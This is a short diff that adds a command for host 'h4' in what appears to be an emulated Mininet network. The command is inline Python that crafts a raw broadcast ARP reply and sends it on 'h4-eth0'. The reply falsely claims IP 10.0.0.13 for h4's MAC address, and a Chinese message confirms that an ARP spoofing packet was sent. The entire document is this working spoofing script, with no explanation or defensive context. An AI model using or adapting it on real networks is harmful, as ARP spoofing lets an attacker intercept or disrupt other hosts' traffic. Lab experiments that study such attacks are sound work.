@@ -1,0 +1,22 @@
+h4 python3 -c "
+import socket
+import struct
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+s.bind(('h4-eth0', 0))
+
+arp_response = (
+    b'\xff\xff\xff\xff\xff\xff' + 
+    b'\x00\x00\x00\x00\x00\x04' + 
+    b'\x08\x06' +
+    b'\x00\x01\x08\x00\x06\x04\x00\x02' +
+    b'\x00\x00\x00\x00\x00\x04' +
+    b'\x0a\x00\x00\x0d' +
+    b'\x00\x00\x00\x00\x00\x00' +
+    b'\x00\x00\x00\x00'
+)
+
+s.send(arp_response)
+s.close()
+print('ARP欺骗包已发送: h4声称IP 10.0.0.13')
+"
